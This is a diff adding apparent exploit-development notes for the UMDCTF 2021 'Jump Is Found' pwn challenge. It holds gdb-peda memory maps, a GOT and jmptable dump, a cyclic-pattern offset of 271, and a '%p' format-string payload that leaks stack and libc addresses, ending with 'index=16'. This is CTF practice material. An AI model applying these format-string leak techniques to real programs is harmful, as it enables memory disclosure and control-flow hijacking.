@@ -1,0 +1,98 @@
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x00400000         0x00401000         r--p	/home/mito/CTF/UMDCTF_2021/Pwn_Jump_Is_Found/JIF
+0x00401000         0x00402000         r-xp	/home/mito/CTF/UMDCTF_2021/Pwn_Jump_Is_Found/JIF
+0x00402000         0x00403000         r--p	/home/mito/CTF/UMDCTF_2021/Pwn_Jump_Is_Found/JIF
+0x00403000         0x00404000         r--p	/home/mito/CTF/UMDCTF_2021/Pwn_Jump_Is_Found/JIF
+0x00404000         0x00405000         rw-p	/home/mito/CTF/UMDCTF_2021/Pwn_Jump_Is_Found/JIF
+0x00405000         0x00426000         rw-p	[heap]
+0x00007ffff79e2000 0x00007ffff7bc9000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7bc9000 0x00007ffff7dc9000 ---p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dc9000 0x00007ffff7dcd000 r--p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dcd000 0x00007ffff7dcf000 rw-p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dcf000 0x00007ffff7dd3000 rw-p	mapped
+0x00007ffff7dd3000 0x00007ffff7dfc000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7fd5000 0x00007ffff7fd7000 rw-p	mapped
+0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+
+gdb-peda$ x/80gx 0x404000
+0x404000:	0x0000000000403e20	0x00007ffff7ffe170
+0x404010:	0x00007ffff7dea8f0	0x00007ffff7a648f0
+0x404020:	0x00007ffff7a98950	0x00007ffff7a62aa0
+0x404030:	0x00007ffff7b704d0	0x00007ffff7a6a5a0
+0x404040:	0x00007ffff7a46f70	0x00007ffff7b70e90
+0x404050:	0x00007ffff7a27230	0x00007ffff7b70a10
+0x404060:	0x00007ffff7a62190	0x00007ffff7a79140
+0x404070:	0x00000000004010e0	0x0000000000000000
+0x404080:	0x0000000000000000	0x0000000000000000
+0x404090:	0x0000000000000000	0x0000000000000000
+0x4040a0 <stdout@@GLIBC_2.2.5>:	0x00007ffff7dce760	0x0000000000000000
+0x4040b0 <stdin@@GLIBC_2.2.5>:	0x00007ffff7dcda00	0x0000000000000000
+0x4040c0 <stderr@@GLIBC_2.2.5>:	0x00007ffff7dce680	0x0000000000000000
+0x4040d0 <jmptable>:	0x0000000000000000	0x0000000000000000
+0x4040e0 <jmptable+16>:	0x0000000000000000	0x0000000000000000
+0x4040f0:	0x0000000000000000	0x0000000000000000
+0x404100:	0x0000000000000000	0x0000000000000000
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x7ffff7dcf8c0 --> 0x0 
+RSI: 0x7fffffffb5f0 ("Current location: ere.")
+RDI: 0x7fffffffdce0 ("A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs"...)
+RBP: 0x7fffffffddf0 --> 0x4016d0 (<__libc_csu_init>:	endbr64)
+RSP: 0x7fffffffdc90 --> 0x1 
+RIP: 0x4016bc (<main+772>:	call   0x401140 <printf@plt>)
+R8 : 0x12 
+R9 : 0x0 
+R10: 0x21 ('!')
+R11: 0x246 
+R12: 0x4011b0 (<_start>:	endbr64)
+R13: 0x7fffffffded0 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x4016ad <main+757>:	lea    rax,[rbp-0x110]
+   0x4016b4 <main+764>:	mov    rdi,rax
+   0x4016b7 <main+767>:	mov    eax,0x0
+=> 0x4016bc <main+772>:	call   0x401140 <printf@plt>
+   0x4016c1 <main+777>:	mov    edi,0xa
+   0x4016c6 <main+782>:	call   0x4010f0 <putchar@plt>
+   0x4016cb <main+787>:	jmp    0x4014c2 <main+266>
+   0x4016d0 <__libc_csu_init>:	endbr64
+Guessed arguments:
+arg[0]: 0x7fffffffdce0 ("A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs"...)
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdc90 --> 0x1 
+0008| 0x7fffffffdc98 --> 0x1000000000 
+0016| 0x7fffffffdca0 --> 0x405260 ("AAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAy"...)
+0024| 0x7fffffffdca8 --> 0x405260 ("AAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAy"...)
+0032| 0x7fffffffdcb0 --> 0x405370 ("A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs"...)
+0040| 0x7fffffffdcb8 --> 0x405480 --> 0x4012dd (<jumpToHoth>:	endbr64)
+0048| 0x7fffffffdcc0 ("We are at Earth!")
+0056| 0x7fffffffdcc8 ("t Earth!")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x00000000004016bc in main ()
+gdb-peda$ patto A%IA%
+A%IA% found at offset: 271
+
+SYSTEM CONSOLE> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3AAAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,,%p,%p,%p,%p,%p,%p,%p,%p,%p,,%p,%p,%p,%p,%p,%p,%p,%p,%p,
+Check Systems
+1 - Hoth
+2 - Black Hole
+3 - Mars
+4 - Logout
+Current location: AAAAAAAA,0x7fffffffb5f0,0x7ffff7dcf8c0,(nil),0x12,(nil),0x1,0x1000000000,0x405260,0x405260,,0x405370,0x405480,0x6120657261206557,0x2168747261452074,(nil),0x7ffff7dde39f,0x4141414141414141,0x252c70252c70252c,0x2c70252c70252c70,,0x70252c70252c7025,0x2c70252c2c70252c,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x2c70252c,
+SYSTEM CONSOLE> 
+
+index=16
+
